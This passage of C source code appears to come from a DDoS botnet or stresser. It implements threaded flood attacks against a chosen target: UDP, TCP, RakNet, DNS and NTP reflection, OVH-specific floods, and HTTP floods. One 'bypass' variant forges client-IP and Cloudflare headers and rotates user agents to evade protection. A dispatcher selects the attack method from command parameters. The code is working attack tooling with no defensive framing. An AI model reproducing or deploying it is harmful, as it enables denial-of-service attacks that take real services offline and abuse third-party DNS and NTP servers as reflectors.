                packet[7] = 0x00;
                packet[8] = 0x00;
                packet[9] = 0x00;
                packet[10] = 0x00;
                packet[11] = 0x00;
            }
            if ((rand_cmwc() % 100) < 5) {
                packet[0] = 0x94;
                packet[1] = 0x00;
                packet[2] = 0x00;
                packet[3] = 0x00;
                packet[4] = 0x00;
            }
            if ((rand_cmwc() % 100) < 4) {
                packet[0] = 0x95;
                packet[1] = 0x00;
                packet[2] = 0x00;
                packet[3] = 0x00;
                packet[4] = 0x00;
                packet[5] = 0x00;
                packet[6] = 0x00;
                packet[7] = 0x00;
            }
            int sent = sendto(sockfd, packet, pkt_size, 0, (struct sockaddr*)&addr, sizeof(addr));
            if (sent < 0) {
                close(sockfd);
                sockfds[idx] = socket(AF_INET, SOCK_DGRAM, 0);
                if (sockfds[idx] >= 0) {
                    int bufsize = 1024 * 1024 * 4;
                    setsockopt(sockfds[idx], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
                }
            }
            if ((rand_cmwc() % 100) < 10) {
                usleep((rand_cmwc() % 100) + 10);
            }
            if ((rand_cmwc() % 100) < 5) {
                sendto(sockfd, packet, pkt_size / 2, 0, (struct sockaddr*)&addr, sizeof(addr));
            }
        }
        free(packet);
        return NULL;
    }
    for (int i = 0; i < num_threads; i++) {
        int* idx = malloc(sizeof(int));
        *idx = i;
        pthread_create(&threads[i], NULL, raknet_worker, idx);
    }
    sleep(duracao);
    attack_running = 0;
    for (int i = 0; i < num_threads; i++) {
        pthread_cancel(threads[i]);
        pthread_join(threads[i], NULL);
        if (sockfds[i] >= 0) close(sockfds[i]);
    }
    free(threads);
    free(sockfds);
    free(params);
    return NULL;
}

void* dns_flood(void* arg) {
    char* params = (char*)arg;
    char* saveptr;
    char* target = strtok_r(params, "|", &saveptr);
    char* port_str = strtok_r(NULL, "|", &saveptr);
    char* dur_str = strtok_r(NULL, "|", &saveptr);
    char* file_str = strtok_r(NULL, "|", &saveptr);
    char* threads_str = strtok_r(NULL, "|", &saveptr);
    if (!target || !port_str || !dur_str || !file_str) {
        free(params);
        attack_running = 0;
        return NULL;
    }
    int duracao = atoi(dur_str);
    int num_threads = threads_str ? atoi(threads_str) : 10;
    int port = atoi(port_str);
    head = NULL;
    char *strLine = (char *) malloc(256);
    strLine = memset(strLine, 0x00, 256);
    int iLine = 0;
    FILE *list_fd = fopen(file_str, "r");
    while (fgets(strLine, 256, list_fd) != NULL) {
        ParseResolverLine(strLine, iLine);
        iLine++;
    }
    fclose(list_fd);
    if (head == NULL) {
        free(params);
        attack_running = 0;
        return NULL;
    }
    struct list *current = head->next;
    pthread_t thread[num_threads];
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(0);
    sin.sin_addr.s_addr = inet_addr(target);
    struct thread_data td[num_threads];
    for (int i = 0; i < num_threads; i++) {
        td[i].thread_id = i;
        td[i].sin = sin;
        td[i].list_node = current;
        td[i].port = port;
        pthread_create(&thread[i], NULL, dns_worker, (void *) &td[i]);
    }
    sleep(duracao);
    attack_running = 0;
    for (int i = 0; i < num_threads; i++) {
        pthread_cancel(thread[i]);
        pthread_join(thread[i], NULL);
    }
    free(strLine);
    free(params);
    return NULL;
}

void* ntp_flood(void* arg) {
    char* params = (char*)arg;
    char* saveptr;
    char* target = strtok_r(params, "|", &saveptr);
    char* threads_str = strtok_r(NULL, "|", &saveptr);
    char* limiter_str = strtok_r(NULL, "|", &saveptr);
    char* dur_str = strtok_r(NULL, "|", &saveptr);
    if (!target || !threads_str || !limiter_str || !dur_str) {
        free(params);
        attack_running = 0;
        return NULL;
    }
    int num_threads = atoi(threads_str);
    int maxpps = atoi(limiter_str);
    int duracao = atoi(dur_str);
    limiter = 0;
    pps = 0;
    sleeptime = 100;
    head = NULL;
    resolve_ntp_servers();
    if (head == NULL) {
        free(params);
        attack_running = 0;
        return NULL;
    }
    struct list *current = head->next;
    pthread_t thread[num_threads];
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(target);
    struct thread_data td[num_threads];
    for (int i = 0; i < num_threads; i++) {
        td[i].thread_id = i;
        td[i].sin = sin;
        td[i].list_node = current;
        pthread_create(&thread[i], NULL, ntp_worker, (void *) &td[i]);
    }
    int multiplier = 20;
    for (int i = 0; i < (duracao * multiplier); i++) {
        usleep((1000/multiplier)*1000);
        if ((pps * multiplier) > maxpps) {
            if (1 > limiter) {
                sleeptime += 100;
            } else {
                limiter--;
            }
        } else {
            limiter++;
            if (sleeptime > 25) {
                sleeptime -= 25;
            } else {
                sleeptime = 0;
            }
        }
        pps = 0;
    }
    attack_running = 0;
    for (int i = 0; i < num_threads; i++) {
        pthread_cancel(thread[i]);
        pthread_join(thread[i], NULL);
    }
    free(params);
    return NULL;
}

void* ovh_tcp_flood(void* arg) {
    char* params = (char*)arg;
    char* saveptr;
    char* target = strtok_r(params, "|", &saveptr);
    char* port_str = strtok_r(NULL, "|", &saveptr);
    char* threads_str = strtok_r(NULL, "|", &saveptr);
    char* limiter_str = strtok_r(NULL, "|", &saveptr);
    char* dur_str = strtok_r(NULL, "|", &saveptr);
    if (!target || !port_str || !threads_str || !limiter_str || !dur_str) {
        free(params);
        attack_running = 0;
        return NULL;
    }
    int num_threads = atoi(threads_str);
    floodport = atoi(port_str);
    int maxpps = atoi(limiter_str);
    int duracao = atoi(dur_str);
    limiter = 0;
    pps = 0;
    sleeptime = 100;
    pthread_t thread[num_threads];
    int multiplier = 20;
    for (int i = 0; i < num_threads; i++) {
        pthread_create(&thread[i], NULL, ovh_tcp_worker, (void *)target);
    }
    for (int i = 0; i < (duracao * multiplier); i++) {
        usleep((1000/multiplier)*1000);
        if ((pps * multiplier) > maxpps) {
            if (1 > limiter) {
                sleeptime += 100;
            } else {
                limiter--;
            }
        } else {
            limiter++;
            if (sleeptime > 25) {
                sleeptime -= 25;
            } else {
                sleeptime = 0;
            }
        }
        pps = 0;
    }
    attack_running = 0;
    for (int i = 0; i < num_threads; i++) {
        pthread_cancel(thread[i]);
        pthread_join(thread[i], NULL);
    }
    free(params);
    return NULL;
}

void* udp_worker(void* arg) {
    char* params = (char*)arg;
    char* saveptr;
    char* target = strtok_r(params, "|", &saveptr);
    char* port_str = strtok_r(NULL, "|", &saveptr);
    char* size_str = strtok_r(NULL, "|", &saveptr);
    char* dur_str = strtok_r(NULL, "|", &saveptr);
    if (!target || !port_str || !dur_str) {
        free(params);
        return NULL;
    }
    int port = atoi(port_str);
    int pkt_size = size_str ? atoi(size_str) : 1024;
    int duracao = atoi(dur_str);
    if (pkt_size < 64) pkt_size = 64;
    if (pkt_size > 1472) pkt_size = 1472;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        free(params);
        return NULL;
    }
    int bufsize = 1024 * 1024 * 4;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    inet_pton(AF_INET, target, &sin.sin_addr);
    uint8_t* packet = malloc(pkt_size);
    time_t end = time(NULL) + duracao;
    while (attack_running && time(NULL) < end) {
        for (int i = 0; i < pkt_size; i++) {
            packet[i] = rand_cmwc() & 0xFF;
        }
        sendto(sockfd, packet, pkt_size, 0, (struct sockaddr*)&sin, sizeof(sin));
        if ((rand_cmwc() % 100) < 5) {
            usleep(rand_cmwc() % 10);
        }
    }
    free(packet);
    close(sockfd);
    free(params);
    return NULL;
}

void* udp_flood(void* arg) {
    char* params = (char*)arg;
    char* saveptr;
    char* target = strtok_r(params, "|", &saveptr);
    char* port_str = strtok_r(NULL, "|", &saveptr);
    char* dur_str = strtok_r(NULL, "|", &saveptr);
    char* threads_str = strtok_r(NULL, "|", &saveptr);
    char* size_str = strtok_r(NULL, "|", &saveptr);
    if (!target || !port_str || !dur_str) {
        free(params);
        attack_running = 0;
        return NULL;
    }
    int duracao = atoi(dur_str);
    int num_threads = threads_str ? atoi(threads_str) : 10;
    if (num_threads > 50) num_threads = 50;
    char args[512];
    snprintf(args, sizeof(args), "%s|%s|%s|%s", target, port_str, size_str ? size_str : "1024", dur_str);
    pthread_t threads[num_threads];
    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, udp_worker, strdup(args));
    }
    sleep(duracao);
    attack_running = 0;
    for (int i = 0; i < num_threads; i++) {
        pthread_cancel(threads[i]);
        pthread_join(threads[i], NULL);
    }
    free(params);
    return NULL;
}

void* tcp_worker(void* arg) {
    char* params = (char*)arg;
    char* saveptr;
    char* target = strtok_r(params, "|", &saveptr);
    char* port_str = strtok_r(NULL, "|", &saveptr);
    char* dur_str = strtok_r(NULL, "|", &saveptr);
    if (!target || !port_str || !dur_str) {
        free(params);
        return NULL;
    }
    int port = atoi(port_str);
    int duracao = atoi(dur_str);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    inet_pton(AF_INET, target, &sin.sin_addr);
    time_t end = time(NULL) + duracao;
    while (attack_running && time(NULL) < end) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd >= 0) {
            int flags = fcntl(sockfd, F_GETFL, 0);
            fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
            connect(sockfd, (struct sockaddr*)&sin, sizeof(sin));
            char buffer[1024];
            memset(buffer, rand_cmwc() & 0xFF, 1024);
            send(sockfd, buffer, 1024, 0);
            close(sockfd);
        }
        if ((rand_cmwc() % 100) < 10) {
            usleep(rand_cmwc() % 100);
        }
    }
    free(params);
    return NULL;
}

void* tcp_flood(void* arg) {
    char* params = (char*)arg;
    char* saveptr;
    char* target = strtok_r(params, "|", &saveptr);
    char* port_str = strtok_r(NULL, "|", &saveptr);
    char* dur_str = strtok_r(NULL, "|", &saveptr);
    char* threads_str = strtok_r(NULL, "|", &saveptr);
    if (!target || !port_str || !dur_str) {
        free(params);
        attack_running = 0;
        return NULL;
    }
    int duracao = atoi(dur_str);
    int num_threads = threads_str ? atoi(threads_str) : 10;
    if (num_threads > 50) num_threads = 50;
    char args[512];
    snprintf(args, sizeof(args), "%s|%s|%s", target, port_str, dur_str);
    pthread_t threads[num_threads];
    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, tcp_worker, strdup(args));
    }
    sleep(duracao);
    attack_running = 0;
    for (int i = 0; i < num_threads; i++) {
        pthread_cancel(threads[i]);
        pthread_join(threads[i], NULL);
    }
    free(params);
    return NULL;
}

void* http_worker(void* arg) {
    char* params = (char*)arg;
    char* saveptr;
    char* target = strtok_r(params, "|", &saveptr);
    char* port_str = strtok_r(NULL, "|", &saveptr);
    char* path_str = strtok_r(NULL, "|", &saveptr);
    char* dur_str = strtok_r(NULL, "|", &saveptr);
    if (!target || !port_str || !dur_str) {
        free(params);
        return NULL;
    }
    int port = atoi(port_str);
    int duracao = atoi(dur_str);
    char path[256] = "/";
    if (path_str) strncpy(path, path_str, sizeof(path)-1);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    inet_pton(AF_INET, target, &sin.sin_addr);
    time_t end = time(NULL) + duracao;
    while (attack_running && time(NULL) < end) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd >= 0) {
            int flags = fcntl(sockfd, F_GETFL, 0);
            fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
            connect(sockfd, (struct sockaddr*)&sin, sizeof(sin));
            char request[4096];
            int r = rand_cmwc() % 3;
            if (r == 0) {
                snprintf(request, sizeof(request),
                    "GET %s HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n"
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                    "Accept-Language: en-US,en;q=0.9\r\n"
                    "Accept-Encoding: gzip, deflate, br\r\n"
                    "Connection: keep-alive\r\n"
                    "Upgrade-Insecure-Requests: 1\r\n"
                    "Cache-Control: max-age=0\r\n"
                    "Sec-Fetch-Dest: document\r\n"
                    "Sec-Fetch-Mode: navigate\r\n"
                    "Sec-Fetch-Site: none\r\n"
                    "Sec-Fetch-User: ?1\r\n"
                    "\r\n",
                    path, target);
            } else if (r == 1) {
                snprintf(request, sizeof(request),
                    "POST %s HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Content-Length: 1000\r\n"
                    "Accept: */*\r\n"
                    "Accept-Encoding: gzip, deflate\r\n"
                    "Connection: close\r\n"
                    "\r\n"
                    "data=%s&session=%d&token=%d&action=login&username=%d&password=%d&submit=1&",
                    path, target, target, rand_cmwc(), rand_cmwc(), rand_cmwc(), rand_cmwc());
            } else {
                snprintf(request, sizeof(request),
                    "GET %s HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                    "Accept: */*\r\n"
                    "Accept-Encoding: gzip, deflate\r\n"
                    "Connection: keep-alive\r\n"
                    "X-Forwarded-For: %d.%d.%d.%d\r\n"
                    "X-Real-IP: %d.%d.%d.%d\r\n"
                    "Referer: http://%s/\r\n"
                    "\r\n",
                    path, target,
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255,
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255,
                    target);
            }
            send(sockfd, request, strlen(request), 0);
            close(sockfd);
        }
        if ((rand_cmwc() % 100) < 5) {
            usleep(rand_cmwc() % 50);
        }
    }
    free(params);
    return NULL;
}

void* http_flood(void* arg) {
    char* params = (char*)arg;
    char* saveptr;
    char* target = strtok_r(params, "|", &saveptr);
    char* port_str = strtok_r(NULL, "|", &saveptr);
    char* dur_str = strtok_r(NULL, "|", &saveptr);
    char* threads_str = strtok_r(NULL, "|", &saveptr);
    char* path_str = strtok_r(NULL, "|", &saveptr);
    if (!target || !port_str || !dur_str) {
        free(params);
        attack_running = 0;
        return NULL;
    }
    int duracao = atoi(dur_str);
    int num_threads = threads_str ? atoi(threads_str) : 10;
    if (num_threads > 50) num_threads = 50;
    char args[512];
    snprintf(args, sizeof(args), "%s|%s|%s|%s", target, port_str, path_str ? path_str : "/", dur_str);
    pthread_t threads[num_threads];
    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, http_worker, strdup(args));
    }
    sleep(duracao);
    attack_running = 0;
    for (int i = 0; i < num_threads; i++) {
        pthread_cancel(threads[i]);
        pthread_join(threads[i], NULL);
    }
    free(params);
    return NULL;
}

void* http_bypass_worker(void* arg) {
    char* params = (char*)arg;
    char* saveptr;
    char* target = strtok_r(params, "|", &saveptr);
    char* port_str = strtok_r(NULL, "|", &saveptr);
    char* path_str = strtok_r(NULL, "|", &saveptr);
    char* dur_str = strtok_r(NULL, "|", &saveptr);
    if (!target || !port_str || !dur_str) {
        free(params);
        return NULL;
    }
    int port = atoi(port_str);
    int duracao = atoi(dur_str);
    char path[256] = "/";
    if (path_str) strncpy(path, path_str, sizeof(path)-1);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    inet_pton(AF_INET, target, &sin.sin_addr);
    time_t end = time(NULL) + duracao;
    while (attack_running && time(NULL) < end) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd >= 0) {
            int flags = fcntl(sockfd, F_GETFL, 0);
            fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
            connect(sockfd, (struct sockaddr*)&sin, sizeof(sin));
            char request[8192];
            char random_agent[256];
            char user_agents[][256] = {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            };
            snprintf(random_agent, sizeof(random_agent), "%s", user_agents[rand_cmwc() % 10]);
            char random_host[128];
            char hosts[][128] = {
                "www.google.com", "www.facebook.com", "www.youtube.com", "www.twitter.com",
                "www.instagram.com", "www.linkedin.com", "www.reddit.com", "www.wikipedia.org",
                "www.amazon.com", "www.ebay.com", "www.netflix.com", "www.spotify.com",
                "www.microsoft.com", "www.apple.com", "www.cloudflare.com", "www.github.com",
                "www.stackoverflow.com", "www.quora.com", "www.medium.com", "www.dev.to"
            };
            snprintf(random_host, sizeof(random_host), "%s", hosts[rand_cmwc() % 20]);
            int method = rand_cmwc() % 4;
            if (method == 0) {
                snprintf(request, sizeof(request),
                    "GET %s?%d=%d&%d=%d&%d=%d HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: %s\r\n"
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                    "Accept-Language: en-US,en;q=0.9\r\n"
                    "Accept-Encoding: gzip, deflate, br\r\n"
                    "Connection: keep-alive\r\n"
                    "Upgrade-Insecure-Requests: 1\r\n"
                    "Sec-Fetch-Dest: document\r\n"
                    "Sec-Fetch-Mode: navigate\r\n"
                    "Sec-Fetch-Site: none\r\n"
                    "Sec-Fetch-User: ?1\r\n"
                    "Cache-Control: no-cache\r\n"
                    "Pragma: no-cache\r\n"
                    "X-Forwarded-For: %d.%d.%d.%d\r\n"
                    "X-Real-IP: %d.%d.%d.%d\r\n"
                    "X-Originating-IP: %d.%d.%d.%d\r\n"
                    "X-Remote-IP: %d.%d.%d.%d\r\n"
                    "X-Remote-Addr: %d.%d.%d.%d\r\n"
                    "X-Client-IP: %d.%d.%d.%d\r\n"
                    "\r\n",
                    path, rand_cmwc(), rand_cmwc(), rand_cmwc(), rand_cmwc(), rand_cmwc(), rand_cmwc(),
                    target, random_agent,
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255,
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255,
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255,
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255,
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255,
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255);
            } else if (method == 1) {
                snprintf(request, sizeof(request),
                    "POST %s HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: %s\r\n"
                    "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary%d\r\n"
                    "Content-Length: 4096\r\n"
                    "Accept: */*\r\n"
                    "Accept-Encoding: gzip, deflate, br\r\n"
                    "Connection: keep-alive\r\n"
                    "X-Forwarded-For: %d.%d.%d.%d\r\n"
                    "X-Real-IP: %d.%d.%d.%d\r\n"
                    "Origin: http://%s\r\n"
                    "Referer: http://%s%s\r\n"
                    "\r\n"
                    "------WebKitFormBoundary%d\r\n"
                    "Content-Disposition: form-data; name=\"data\"\r\n\r\n"
                    "%s\r\n"
                    "------WebKitFormBoundary%d--\r\n",
                    path, target, random_agent, rand_cmwc(),
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255,
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255,
                    target, target, path,
                    rand_cmwc(), target, rand_cmwc());
            } else if (method == 2) {
                snprintf(request, sizeof(request),
                    "GET %s HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: %s\r\n"
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    "Accept-Language: en-US,en;q=0.5\r\n"
                    "Accept-Encoding: gzip, deflate\r\n"
                    "Connection: keep-alive\r\n"
                    "Cookie: session=%d; token=%d; user=%d; lang=en; theme=dark; visited=%d\r\n"
                    "DNT: 1\r\n"
                    "Upgrade-Insecure-Requests: 1\r\n"
                    "X-Requested-With: XMLHttpRequest\r\n"
                    "X-Forwarded-For: %d.%d.%d.%d\r\n"
                    "X-Real-IP: %d.%d.%d.%d\r\n"
                    "X-Host: %s\r\n"
                    "X-Original-URL: %s\r\n"
                    "X-Rewrite-URL: %s\r\n"
                    "CF-Connecting-IP: %d.%d.%d.%d\r\n"
                    "CF-IPCountry: US\r\n"
                    "CF-Ray: %d-%s\r\n"
                    "CF-Visitor: {\"scheme\":\"https\"}\r\n"
                    "\r\n",
                    path, target, random_agent,
                    rand_cmwc(), rand_cmwc(), rand_cmwc(), rand_cmwc(),
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255,
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255,
                    random_host, path, path,
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255,
                    rand_cmwc(), random_host);
            } else {
                snprintf(request, sizeof(request),
                    "GET %s HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: %s\r\n"
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    "Accept-Language: en-US,en;q=0.9\r\n"
                    "Accept-Encoding: gzip, deflate, br\r\n"
                    "Connection: keep-alive\r\n"
                    "Upgrade-Insecure-Requests: 1\r\n"
                    "Cache-Control: max-age=0\r\n"
                    "TE: trailers\r\n"
                    "Pragma: no-cache\r\n"
                    "Expires: 0\r\n"
                    "If-Modified-Since: %s\r\n"
                    "If-None-Match: \"%d\"\r\n"
                    "Range: bytes=0-%d\r\n"
                    "X-Forwarded-For: %d.%d.%d.%d\r\n"
                    "X-Real-IP: %d.%d.%d.%d\r\n"
                    "X-Originating-IP: %d.%d.%d.%d\r\n"
                    "True-Client-IP: %d.%d.%d.%d\r\n"
                    "X-Proxy-ID: %d\r\n"
                    "X-Forwarded-Proto: https\r\n"
                    "X-Forwarded-Host: %s\r\n"
                    "X-Forwarded-Port: 443\r\n"
                    "X-Forwarded-Server: %s\r\n"
                    "\r\n",
                    path, target, random_agent,
                    "Mon, 01 Jan 2024 00:00:00 GMT",
                    rand_cmwc(), rand_cmwc() % 10000,
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255,
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255,
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255,
                    rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255, rand_cmwc() % 255,
                    rand_cmwc(), random_host, random_host);
            }
            send(sockfd, request, strlen(request), 0);
            close(sockfd);
        }
        if ((rand_cmwc() % 100) < 3) {
            usleep(rand_cmwc() % 30);
        }
    }
    free(params);
    return NULL;
}

void* http_bypass_flood(void* arg) {
    char* params = (char*)arg;
    char* saveptr;
    char* target = strtok_r(params, "|", &saveptr);
    char* port_str = strtok_r(NULL, "|", &saveptr);
    char* dur_str = strtok_r(NULL, "|", &saveptr);
    char* threads_str = strtok_r(NULL, "|", &saveptr);
    char* path_str = strtok_r(NULL, "|", &saveptr);
    if (!target || !port_str || !dur_str) {
        free(params);
        attack_running = 0;
        return NULL;
    }
    int duracao = atoi(dur_str);
    int num_threads = threads_str ? atoi(threads_str) : 20;
    if (num_threads > 100) num_threads = 100;
    char args[512];
    snprintf(args, sizeof(args), "%s|%s|%s|%s", target, port_str, path_str ? path_str : "/", dur_str);
    pthread_t threads[num_threads];
    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, http_bypass_worker, strdup(args));
    }
    sleep(duracao);
    attack_running = 0;
    for (int i = 0; i < num_threads; i++) {
        pthread_cancel(threads[i]);
        pthread_join(threads[i], NULL);
    }
    free(params);
    return NULL;
}

void* attack_dispatcher(void* arg) {
    char* params = (char*)arg;
    char* saveptr;
    char* target = strtok_r(params, "|", &saveptr);
    char* port_str = strtok_r(NULL, "|", &saveptr);
    char* dur_str = strtok_r(NULL, "|", &saveptr);
    char* method = strtok_r(NULL, "|", &saveptr);
    if (!target || !port_str || !dur_str) {
        free(params);
        attack_running = 0;
        return NULL;
    }
    if (method && strcmp(method, "ovh_udp") == 0) {
        char* saveptr2;
        char* copy = strdup(params);
        char* t = strtok_r(copy, "|", &saveptr2);
        char* p = strtok_r(NULL, "|", &saveptr2);
        char* threads_str = strtok_r(NULL, "|", &saveptr2);
        char* limiter_str = strtok_r(NULL, "|", &saveptr2);
        char* dur_str2 = strtok_r(NULL, "|", &saveptr2);
        free(copy);
        if (threads_str && limiter_str && dur_str2) {
            char args[512];
            snprintf(args, sizeof(args), "%s|%s|%s|%s|%s",
                     target, p, threads_str, limiter_str, dur_str2);
            attack_running = 1;
            ovh_udp_flood(strdup(args));
        }
    } else if (method && strcmp(method, "raknet") == 0) {
        char* saveptr2;
        char* copy = strdup(params);
        char* t = strtok_r(copy, "|", &saveptr2);
        char* p = strtok_r(NULL, "|", &saveptr2);
        char* d = strtok_r(NULL, "|", &saveptr2);
        char* threads_str = strtok_r(NULL, "|", &saveptr2);
        char* size_str = strtok_r(NULL, "|", &saveptr2);
        free(copy);
        char args[512];
        snprintf(args, sizeof(args), "%s|%s|%s|%s|%s",
                 target, port_str, dur_str,
                 threads_str ? threads_str : "10",
                 size_str ? size_str : "512");
        attack_running = 1;
        raknet_flood(strdup(args));
    } else if (method && strcmp(method, "dns") == 0) {
        char* saveptr2;
        char* copy = strdup(params);
        char* t = strtok_r(copy, "|", &saveptr2);
        char* p = strtok_r(NULL, "|", &saveptr2);
        char* d = strtok_r(NULL, "|", &saveptr2);
        char* file_str = strtok_r(NULL, "|", &saveptr2);
        char* threads_str = strtok_r(NULL, "|", &saveptr2);
        free(copy);
        if (file_str) {
            char args[512];
            snprintf(args, sizeof(args), "%s|%s|%s|%s|%s",
                     target, port_str, dur_str,
                     file_str,
                     threads_str ? threads_str : "10");
            attack_running = 1;
            dns_flood(strdup(args));
        }
    } else if (method && strcmp(method, "ntp") == 0) {
        char* saveptr2;
        char* copy = strdup(params);
        char* t = strtok_r(copy, "|", &saveptr2);
        char* threads_str = strtok_r(NULL, "|", &saveptr2);
        char* limiter_str = strtok_r(NULL, "|", &saveptr2);
        char* dur_str2 = strtok_r(NULL, "|", &saveptr2);
        free(copy);
        if (threads_str && limiter_str && dur_str2) {
            char args[512];
            snprintf(args, sizeof(args), "%s|%s|%s|%s",
                     target, threads_str, limiter_str, dur_str2);
            attack_running = 1;
            ntp_flood(strdup(args));
        }
    } else if (method && strcmp(method, "ovh_tcp") == 0) {
        char* saveptr2;
        char* copy = strdup(params);
        char* t = strtok_r(copy, "|", &saveptr2);
        char* p = strtok_r(NULL, "|", &saveptr2);
        char* d = strtok_r(NULL, "|", &saveptr2);
        char* threads_str = strtok_r(NULL, "|", &saveptr2);
        char* limiter_str = strtok_r(NULL, "|", &saveptr2);
        char* dur_str2 = strtok_r(NULL, "|", &saveptr2);
        free(copy);
        if (threads_str && limiter_str && dur_str2) {
            char args[512];
            snprintf(args, sizeof(args), "%s|%s|%s|%s|%s",
                     target, p, threads_str, limiter_str, dur_str2);
            attack_running = 1;
            ovh_tcp_flood(strdup(args));
        }
    } else if (method && strcmp(method, "udp") == 0) {
        char* saveptr2;
        char* copy = strdup(params);
        char* t = strtok_r(copy, "|", &saveptr2);
        char* p = strtok_r(NULL, "|", &saveptr2);
        char* d = strtok_r(NULL, "|", &saveptr2);
        char* threads_str = strtok_r(NULL, "|", &saveptr2);
        char* size_str = strtok_r(NULL, "|", &saveptr2);
        free(copy);
        char args[512];
        snprintf(args, sizeof(args), "%s|%s|%s|%s|%s",
                 target, port_str, dur_str,
                 threads_str ? threads_str : "10",
                 size_str ? size_str : "1024");
        attack_running = 1;
        udp_flood(strdup(args));
    } else if (method && strcmp(method, "tcp") == 0) {
        char* saveptr2;
        char* copy = strdup(params);
        char* t = strtok_r(copy, "|", &saveptr2);
        char* p = strtok_r(NULL, "|", &saveptr2);
        char* d = strtok_r(NULL, "|", &saveptr2);
        char* threads_str = strtok_r(NULL, "|", &saveptr2);
        free(copy);
